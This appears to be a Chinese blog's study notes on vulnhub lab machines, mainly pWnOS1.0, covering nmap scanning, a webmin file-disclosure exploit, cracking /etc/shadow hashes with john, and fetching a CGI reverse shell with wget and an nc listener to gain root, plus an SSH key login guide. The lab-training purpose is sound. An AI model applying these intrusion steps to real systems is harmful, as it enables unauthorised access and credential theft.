+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name 文件名 2&gt;/dev/null</span><br><span class="line">找 根目录下的文件 按名字找 丢掉错误信息（因为我们权限低，有很多报错）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306595.png" alt="image-20251110200404480"></p>
+<p><strong>发现确实存在多个文件，我们刚才试的是在 www 目录下，var 目录下还有一个，很有可能是。试一下，密码不一样</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306596.png" alt="image-20251110200647722"></p>
+<h2 id="MySQL-数据获取"><a href="#MySQL-数据获取" class="headerlink" title="MySQL 数据获取"></a>MySQL 数据获取</h2><p><strong>发现我们成功登入数据库，接下来就是查 数据库-表-用户名密码</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306597.png" alt="image-20251110201230849"></p>
+<p><strong>查数据库，发现有之前文件中提到的****ch16</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306598.png" alt="image-20251110201506426"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306599.png" alt="image-20251110201352412"></p>
+<p><strong>那就切换到 ch16 库</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306600.png" alt="image-20251110201625075"></p>
+<p><strong>看表</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306601.png" alt="image-20251110201648262"></p>
+<p><strong>取出表中的所有数据</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306602.png" alt="image-20251110201725668"></p>
+<h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><p><strong>hash-identifier  发现是 SHA-1 加密</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306603.png" alt="image-20251110201847239"></p>
+<p><strong>最快的是浏览器搜相关工具 sha-1 crack</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306604.png" alt="image-20251110202044440"></p>
+<h2 id="ssh-登录的尝试–密码复用-x"><a href="#ssh-登录的尝试–密码复用-x" class="headerlink" title="ssh 登录的尝试–密码复用 x"></a>ssh 登录的尝试–密码复用 x</h2><p><strong>他的名字是 Dan 他的用户名是什么，会是 admin 或者 root 吗</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306602.png" alt="image-20251110201725668"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306605.png" alt="image-20251110202258211"></p>
+<p><strong>简单尝试都不行，那怎么办？</strong></p>
+<p><strong>很简单，直接在反弹的 shell 中找****有哪些用户</strong>就可以了，</p>
+<p><strong><code>cat /etc/passwd</code></strong>   发现只有 <strong>dan</strong> 这个用户，但我们试过了不可以，怎么办？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306606.png" alt="image-20251110202529371"></p>
+<p><strong>这条路目前看来是走不通了，最后再试一下****密码复用</strong>	<strong>也就是说看看登录数据库的密码能不能登 ssh</strong></p>
+<p><strong>这个没用可能要看****内核漏洞</strong>了  &#x2F; UDF 提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306607.png" alt="image-20251110202849089"></p>
+<h2 id="root-权限"><a href="#root-权限" class="headerlink" title="root 权限"></a>root 权限</h2><p><strong>用该密码成功登录 root 账户</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306608.png" alt="image-20251110203013801"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306609.png" alt="image-20251110203122858"></p>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306610.png" alt="image-20251110204057416"></p>
+<p><strong>可以尝试 UDF 提权</strong>  <strong>以后学一下</strong></p>
+<h3 id="一、开源传统-CMS（PHP-NET-Java-系）"><a href="#一、开源传统-CMS（PHP-NET-Java-系）" class="headerlink" title="一、开源传统 CMS（PHP &#x2F; .NET &#x2F; Java 系）"></a>一、开源传统 CMS（PHP &#x2F; .NET &#x2F; Java 系）</h3><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>技术栈</strong></th>
+<th><strong>2025 年主要特点</strong></th>
+<th><strong>适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>WordPress</strong></td>
+<td><strong>PHP+MySQL</strong></td>
+<td><strong>全球市占率 65%+，5.8 万个插件、AI 写作助手、5 分钟安装，仍是最流行</strong></td>
+<td><strong>博客、中小企业官网、电商（WooCommerce）</strong></td>
+</tr>
+<tr>
+<td><strong>Joomla!</strong></td>
+<td><strong>PHP+MySQL</strong></td>
+<td><strong>多语言、权限细、模板可混合使用，适合会员站</strong></td>
+<td><strong>社区、协会、中小门户</strong></td>
+</tr>
+<tr>
+<td><strong>Drupal</strong></td>
+<td><strong>PHP+MySQL</strong></td>
+<td><strong>安全口碑最好，支持复杂内容架构，政府&#x2F;高校首选</strong></td>
+<td><strong>高安全、高并发、多站点集团</strong></td>
+</tr>
+<tr>
+<td><strong>TYPO3</strong></td>
+<td><strong>PHP+MySQL</strong></td>
+<td><strong>欧洲企业级老牌，内置多站点、工作流</strong></td>
+<td><strong>制造业、跨国多语言集团</strong></td>
+</tr>
+<tr>
+<td><strong>MODx &#x2F; OpenCms &#x2F; Liferay 等</strong></td>
+<td><strong>PHP &#x2F; Java</strong></td>
+<td><strong>偏开发者向，可深度定制</strong></td>
+<td><strong>项目型公司、内网门户</strong></td>
+</tr>
+</tbody></table>
+<h3 id="二、SaaS-云建站-CMS（零代码-电商-拖拽）"><a href="#二、SaaS-云建站-CMS（零代码-电商-拖拽）" class="headerlink" title="二、SaaS 云建站 CMS（零代码 &#x2F; 电商 &#x2F; 拖拽）"></a>二、SaaS 云建站 CMS（零代码 &#x2F; 电商 &#x2F; 拖拽）</h3><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>类型</strong></th>
+<th><strong>2025 年主要特点</strong></th>
+<th><strong>适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Shopify</strong></td>
+<td><strong>电商 SaaS</strong></td>
+<td><strong>一站式电商 + 支付 + 物流，App 市场丰富</strong></td>
+<td><strong>外贸 B2C、DTC 品牌</strong></td>
+</tr>
+<tr>
+<td><strong>Wix</strong></td>
+<td><strong>通用 SaaS</strong></td>
+<td><strong>AI 网站生成，拖拽式，模板多</strong></td>
+<td><strong>个人作品、活动页、小型企业</strong></td>
+</tr>
+<tr>
+<td><strong>Adobe Commerce（原 Magento）</strong></td>
+<td><strong>企业电商</strong></td>
+<td><strong>多店铺、AI 推荐、营销自动化</strong></td>
+<td><strong>中大型电商、多渠道零售</strong></td>
+</tr>
+</tbody></table>
+<h3 id="三、新一代「无头-CMS」-知识体验云（API-优先，内容-AI）"><a href="#三、新一代「无头-CMS」-知识体验云（API-优先，内容-AI）" class="headerlink" title="三、新一代「无头 CMS」&amp; 知识体验云（API 优先，内容 +AI）"></a>三、新一代「无头 CMS」&amp; 知识体验云（API 优先，内容 +AI）</h3><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>架构</strong></th>
+<th><strong>2025 年主要特点</strong></th>
+<th><strong>适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Baklib</strong></td>
+<td><strong>无头 +AI</strong></td>
+<td><strong>三层（资源 + 知识 + 应用）、AI 翻译&#x2F;标签&#x2F;搜索、多语言、SEO、可私有部署</strong></td>
+<td><strong>企业官网、帮助中心、知识库、品牌内容中台</strong></td>
+</tr>
+<tr>
+<td><strong>Strapi</strong></td>
+<td><strong>Node.js 无头</strong></td>
+<td><strong>开源可自托管，GraphQL &amp; REST 双 API</strong></td>
+<td><strong>前端框架（Next&#x2F;Nuxt）全栈项目</strong></td>
+</tr>
+<tr>
+<td><strong>Ghost</strong></td>
+<td><strong>Node.js 无头</strong></td>
+<td><strong>原生会员订阅、邮件 Newsletter</strong></td>
+<td><strong>媒体、付费专栏、创作者经济</strong></td>
+</tr>
+<tr>
+<td><strong>Prismic &#x2F; Hygraph &#x2F; ButterCMS 等</strong></td>
+<td><strong>SaaS 无头</strong></td>
+<td><strong>托管型，免运维，多租户</strong></td>
+<td><strong>营销页、小程序、App 内容后台</strong></td>
+</tr>
+</tbody></table>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306611.png" alt="image-20251110211235474"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306613.png" alt="image-20251110211219233"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306614.png" alt="image-20251110211311323">  Drupal</p>
+<h1 id="pWnOS1-0-在-Perl-CGI-架构下构造反弹-shell-解法一"><a href="#pWnOS1-0-在-Perl-CGI-架构下构造反弹-shell-解法一" class="headerlink" title="pWnOS1.0 - 在 Perl CGI 架构下构造反弹 shell-解法一"></a>pWnOS1.0 - 在 Perl CGI 架构下构造反弹 shell-解法一</h1><p><strong>靶机精讲之 pWnOS1.0，vulnhub 靶机，攻击链条很标准，webmin 利用方式不难，公开利用漏洞，但是在 perl cgi 架构了完成的，可能会增加一点点陌生感，毕竟相比 php、apache 架构下少见一些，视频详细讲解了其中原理和实现。利用过程中还涉及密码暴力破解等细节，提权是用权限配置不当获得的。</strong></p>
+<h2 id="渗透测试-webmin"><a href="#渗透测试-webmin" class="headerlink" title="渗透测试 webmin"></a>渗透测试 webmin</h2><p><strong>Webmin 是基于 Web 的类 Unix 系统管理工具，默认监听 TCP&#x2F;10000，提供图形化配置界面。由于功能集中、权限高（常以 root 运行），历史上爆出过多个“认证后命令注入&#x2F;文件操作”类漏洞，是内网渗透常见的突破口之一。可自行 ai</strong></p>
+<h2 id="nmap-扫描-4"><a href="#nmap-扫描-4" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn ip/24</span><br><span class="line">sudo nmap --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap -sT -sV -O -p扫，到，的，端口 ip</span><br><span class="line">sudo nmap -sU --min-rate 10000 -p- ip</span><br><span class="line">sudo nmap --script=vuln -p扫，到，的，端口 ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306615.png" alt="image-20251111184852150"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306616.png" alt="image-20251111184919784"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306617.png" alt="image-20251111185121745"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306618.png" alt="image-20251111185252822"></p>
+<p><strong>是一个 debian 的操作系统</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306619.png" alt="image-20251111190902581"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306620.png" alt="image-20251111190924598"></p>
+<p><strong>我们虽然没有密码，但****暴露出了版本</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306621.png" alt="image-20251111190822467"></p>
+<p><strong>10000 的 mgemt 是 management 的缩写 所有应该是某一个后台管理系统&#x2F;管理端</strong></p>
+<p><strong>如果是为用户使用的服务很少有端口号给这么大的</strong></p>
+<h2 id="Web-渗透-4"><a href="#Web-渗透-4" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="有-80-端口"><a href="#有-80-端口" class="headerlink" title="有 80 端口"></a>有 80 端口</h3><p><strong>,打开 web 页面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306622.png" alt="image-20251111185106361"></p>
+<p><strong>点击 next 之后，这几个圈都是可以点击的，这时候我们要****观察路径结构的变化</strong>，渗透测试页面观察的时候一定要考虑这点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306623.png" alt="image-20251111185431824"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306624.png" alt="image-20251111185920860"></p>
+<p><strong>点对应的圈提示就跟着变，更像是简单的替换</strong></p>
+<p>*<em>url 有</em>***等号“&#x3D;”**也可以测</p>
+<p><strong>简单的 sql 注入</strong> 没有</p>
+<p><strong>文件包含</strong> 没有</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306625.png" alt="image-20251111190123589"></p>
+<p><strong>而在主页却发现可以使用这些漏洞</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306626.png" alt="image-20251111190250894"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306627.png" alt="image-20251111190328132"></p>
+<p><strong>用****curl</strong> 可以直观看到相关信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;完整url&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306628.png" alt="image-20251111190448074"></p>
+<p><strong>明显最后四个是系统常用用户</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306629.png" alt="image-20251111190623731"></p>
+<p><strong>暂时没法干其他事了</strong></p>
+<h3 id="10000-端口"><a href="#10000-端口" class="headerlink" title="10000 端口"></a>10000 端口</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306630.png" alt="image-20251111191446277"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306631.png" alt="image-20251111191507628"></p>
+<p><strong>漏洞扫描结果里提示我们有****webmin 任意文件读取（File Disclosure）</strong></p>
+<p>**可以看一下 webmin 都有哪些漏洞 **<code>searchsploit</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306632.png" alt="image-20251111192015776"></p>
+<p><strong>根据扫描的提示，我们先试试****任意文件读取（File Disclosure）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306633.png" alt="image-20251111192137929"></p>
+<p><strong>获取对应的脚本镜像 -m</strong></p>
+<p><strong>因为是 perl 文件，用 Perl 执行</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306634.png" alt="image-20251111192433817"></p>
+<p><strong>给出了帮助页面，按提示走</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306635.png" alt="image-20251111192524863"></p>
+<p>**一般来说，**<strong>shadow 需要很高的权限</strong>才能看到，之前在主页 80 端口测文件包含的时候看不到，这里可以看全</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306636.png" alt="image-20251111192601033"></p>
+<h2 id="john-密码破解"><a href="#john-密码破解" class="headerlink" title="john 密码破解"></a>john 密码破解</h2><p><strong>接下来就是破解 linux 的密码，可以先保存在 hash 里，然后用 john 破解</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306637.png" alt="image-20251111193026791"></p>
+<p>**普通靶场都可以用 rockyou.txt **</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306638.png" alt="image-20251111193234944"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306639.png" alt="image-20251120115334467"></p>
+<p><strong>最好指定 format&#x3D;xxx     先 hash-identifier 确定是什么类型的 hash</strong></p>
+<h2 id="获得初始-shell-3"><a href="#获得初始-shell-3" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p><strong>依旧是没有什么东西就****给他需要</strong>的，可以直接 ai</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306640.png" alt="image-20251111193405773"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306641.png" alt="image-20251111193520232"></p>
+<p><code>uname -a</code> 低版本的操作系统，有漏洞</p>
+<p><code>sudo -l</code> 没有权限</p>
+<p><code>cat /etc/crontab</code> 没有自定的自动任务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306642.png" alt="image-20251111193649987"></p>
+<h2 id="利用权限配置不当提权"><a href="#利用权限配置不当提权" class="headerlink" title="利用权限配置不当提权"></a>利用权限配置不当提权</h2><p><strong>看一下前台的 CMS 在后端映射出的是什么内容</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306643.png" alt="image-20251111193919659"></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>因为之前说了 shadow 不是普通权限能看的，这里的 www 也有 root 权限 我们能不能把****攻击脚本传到这里，执行后然后反弹 shell 呢</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306644.png" alt="image-20251111194322076"></p>
+<details><summary>为什么要改后缀</summary>
+
+</details>
+
+
+<p><strong>vim 修改一下 cgi 文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306645.png" alt="image-20251111194638002"></p>
+<p><strong>有了脚本，开始上传，在****本机架设服务器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo php -S 0:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306646.png" alt="image-20251111194926238"></p>
+<p><strong>在靶机下载脚本（先把脚本放在熟悉的地方）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http//xxx/文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306647.png" alt="image-20251111195048392"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306648.png" alt="image-20251111195144953"></p>
+<p><strong>发现成功下载，这时没有执行权限，但我们下载到了 vmware 目录（我们获得的初始 shell）里，可以****赋予他执行权限</strong></p>
+<p>**  **<code>ls -liah</code>                    **	**<code>chmod +x shell.cgi</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306649.png" alt="image-20251111195324928"></p>
+<p><strong>开启监听</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306650.png" alt="image-20251111195546623"></p>
+<p><strong>如何执行 shell.cgi 呢？</strong></p>
+<p><strong>利用我们上面使用过的****任意文件读取的漏洞</strong>执行 （<strong>总结里面有提到</strong>）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306651.png" alt="image-20251111200110098"></p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306652.png" alt="image-20251111200142392"></p>
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><h3 id="关于安装的靶机扫不到："><a href="#关于安装的靶机扫不到：" class="headerlink" title="关于安装的靶机扫不到："></a>关于安装的靶机扫不到：</h3><p><strong>啊，不知道有没有这种情况的，改了 nat 模式，还是扫不到主机的。孩子搞了半小时，人都傻掉了，甚至把虚拟网络编辑器都还原默认设置了都没能扫到主机 ip。最后在一个博客上看到打开 vmx 文件的时候，选我已移动主机，再改 nat 模式，才终于成功。心累啊！</strong></p>
+<p><strong>在解压之后选择我已移动靶机，然后改为 nat 网络模式，然后再重启靶机就好了</strong></p>
+<p><strong>解压，打开 vmx，选择移动，开机后改网卡，重启就找到了。</strong></p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<p>**查了一些资料，发现只有在视屏中的这个 **<a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=webmin&seid=12924038164711757847&from_avid=562246009&from_comid=202469995376"><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140743826.png" alt="img">webmin</a> 版本下的文件泄露漏洞的前提下，才会拥有这种既可以读文件、又可以执行 cgi 后缀的 perl 脚本文件的现象，其余时候出现的任意文件泄露漏洞都只能读文件。</p>
+<p><strong>我猜想应该和 php 是一样的，这个漏洞会把文件内容返回到 web 页面，但是 cgi 文件会被解释执行</strong></p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<p><strong>既然可以查看 shadow，那么能直接 john root 的 hash 吗 可以尝试，但靶机不会将其设定为容易破解的 hash，就像 4 个账户，只有一个跑出了密码</strong><img src="https://i2.hdslb.com/bfs/emote/3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png@40w_40h.webp" alt="[doge]"></p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<p><strong>index 下的文件包含为什么读不到 shadow 文件呢，同样是 root 运行呀</strong></p>
+<p><strong>apache 以 root 用户启动，但 fork 出来的工作进程会切换到 www-data，所以读不到</strong><a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=/etc/shadow&seid=3529587962299846281&from_avid=562246009&from_comid=178921606576"><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140743826.png" alt="img">&#x2F;etc&#x2F;shadow</a>，拿到的<a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=reverse&seid=3529587962299846281&from_avid=562246009&from_comid=178921606576"><img src="https://i0.hdslb.com/bfs/reply/9f3ad0659e84c96a711b88dd33f4bc2e945045e0.png" alt="img">reverse</a> shell 也是 www-data</p>
+<p><strong>&#x2F;&#x2F;</strong></p>
+<p><strong>提权的关键点在于 exp 文件的利用，文件泄漏读取文件变为执行文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306653.png" alt="image-20251111201135822"></p>
+<h2 id="perl-格式文件和-cgi-格式文件分别有什么用"><a href="#perl-格式文件和-cgi-格式文件分别有什么用" class="headerlink" title="perl 格式文件和 cgi 格式文件分别有什么用"></a>perl 格式文件和 cgi 格式文件分别有什么用</h2><details><summary>点击展开/收缩</summary>
+
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1></details>
+
+
+<h1 id="pWnOS1-0-选择-hard-模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二"><a href="#pWnOS1-0-选择-hard-模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二" class="headerlink" title="pWnOS1.0 - 选择 hard 模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二"></a>pWnOS1.0 - 选择 hard 模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二</h1><p><strong>靶机精讲之 pWnOS1.0 的解法二，pWnOS1.0 也是 vulnhub 靶机，本视频中的解法利用特定版本号的 openssh 生成秘钥对时的 bug 形成利用场景，获得系统立足点，提权阶段也有别于解法一，用 shellshock 实现提权。满满的细节，全程严密的攻防思路。中间细节精华内容频现，均是渗透经验之谈。</strong></p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><strong>跟解法一一样，都是发现 webmin 的文件包含漏洞并使用</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306654.png" alt="image-20251111204624673"></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>发现有四个常用用户，尝试****找用户的 ssh 文件</strong> 管理员在管理服务器（这台靶机）的时候，要么密码登录，要么 ssh</p>
+<p><strong>思路重要</strong></p>
+<p><strong>这块一定要试，但不一定有</strong></p>
+</blockquote>
+<h2 id="免密登录-authorized-keys-文件获取"><a href="#免密登录-authorized-keys-文件获取" class="headerlink" title="免密登录 authorized_keys 文件获取"></a>免密登录 authorized_keys 文件获取</h2><p><strong>免密登录的核心就是：</strong>  ** <strong>“<strong>把公钥放到对方服务器的 <code>~/.ssh/authorized_keys</code> 文件里</strong> → <strong>SSH 服务端校验后不再询问密码</strong>”。</strong>  ** **下面把“**<strong>默认路径 → 权限要求 → 生成&#x2F;写入方法 → 常见错误 → 安全加固</strong>”一次讲清，照着做即可立刻实现免密。</p>
+<hr>
+<p><strong>一、authorized_keys 默认位置</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>操作系统</strong></th>
+<th><strong>文件绝对路径</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Linux&#x2F;Unix&#x2F;BSD</strong></td>
+<td><code>/home/用户名/.ssh/authorized_keys</code></td>
+<td><strong>每用户一份</strong></td>
+</tr>
+<tr>
+<td><strong>macOS</strong></td>
+<td><code>/Users/用户名/.ssh/authorized_keys</code></td>
+<td><strong>同上</strong></td>
+</tr>
+<tr>
+<td><strong>root 用户</strong></td>
+<td><code>/root/.ssh/authorized_keys</code></td>
+<td><strong>家目录是</strong><code>/root</code></td>
+</tr>
+<tr>
+<td><strong>Windows OpenSSH</strong></td>
+<td><code>C:\Users\用户名\.ssh\authorized_keys</code></td>
+<td><strong>Server 2019&#x2F;2022 内置 OpenSSH 同样认这个文件</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<p>**二、文件&amp;目录权限（**<strong>必做，否则 SSH 拒绝</strong>）</p>
+<table>
+<thead>
+<tr>
+<th><strong>对象</strong></th>
+<th><strong>推荐权限</strong></th>
+<th><strong>一键命令</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户家目录</strong></td>
+<td><strong>755 或 700</strong></td>
+<td><code>chmod 700 /home/user</code></td>
+</tr>
+<tr>
+<td><strong>~&#x2F;.ssh 目录</strong></td>
+<td><strong>700</strong></td>
+<td><code>chmod 700 ~/.ssh</code></td>
+</tr>
+<tr>
+<td><strong>authorized_keys</strong></td>
+<td><strong>600</strong></td>
+<td><code>chmod 600 ~/.ssh/authorized_keys</code></td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>三、免密登录 30 秒实操</strong></p>
+<ol>
+<li>**本地生成密钥（若已有可跳过）  **</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C &quot;my_pc&quot;   # 一路回车，私钥默认 ~/.ssh/id_ed25519</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>**把公钥灌到服务器（三种等效写法）  **</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 法① 官方一键</span><br><span class="line">ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host</span><br><span class="line"># 法② 手动追加</span><br><span class="line">cat ~/.ssh/id_ed25519.pub | ssh user@host &#x27;mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; chmod 600 ~/.ssh/authorized_keys&#x27;</span><br><span class="line"># 法③ 纯手动</span><br><span class="line"># 复制本地 id_ed25519.pub 内容 → 登录服务器 → vi ~/.ssh/authorized_keys → 粘贴保存</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>**测试  **</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host   # 不再提示密码即成功</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>四、常见失败原因排查</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>现象</strong></th>
+<th><strong>最可能原因</strong></th>
+<th><strong>修复</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>仍提示输入密码</strong></td>
+<td><strong>文件&#x2F;目录权限过松</strong></td>
+<td><code>chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys</code></td>
+</tr>
+<tr>
+<td><strong>提示 “Permission denied (publickey)”</strong></td>
+<td><strong>公钥写错&#x2F;多复制了换行</strong></td>
+<td><strong>重新复制，确保一行一条</strong></td>
+</tr>
+<tr>
+<td><strong>日志出现 “Authentication refused: bad ownership or modes”</strong></td>
+<td><strong>家目录或 .ssh 属主错误</strong></td>
+<td><code>chown -R user:user ~/.ssh</code></td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>五、安全加固（生产环境必做）</strong></p>
+<ol>
+<li>**禁止密码暴力  **</li>
+</ol>
